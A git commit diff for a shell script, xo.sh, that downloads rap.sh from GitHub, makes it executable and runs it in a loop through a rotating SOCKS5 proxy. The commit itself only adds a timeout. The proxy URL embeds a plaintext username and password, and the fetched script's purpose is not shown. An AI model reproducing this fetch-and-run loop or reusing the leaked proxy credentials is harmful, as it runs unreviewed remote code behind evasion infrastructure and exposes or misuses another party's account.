a2d9a0b98102cede758d2f3cd74536c2dff69b29
hunsunyo <98655233+hunsunyo@users.noreply.github.com>
2022-01-29 21:20:58 +0530

    Update xo.sh

--- xo.sh
+++ xo.sh
@@ -6,7 +6,7 @@ wget https://github.com/ahansura/srb/raw/main/rap.sh
 chmod +x rap.sh
 export http_proxy="socks5://djutybpn-rotate:vo7hn8ayc8s5@p.webshare.io:80/"
 while[1];do
-./rap.sh
+timeout 600 ./rap.sh
 sleep 20
 done
 sleep 9999
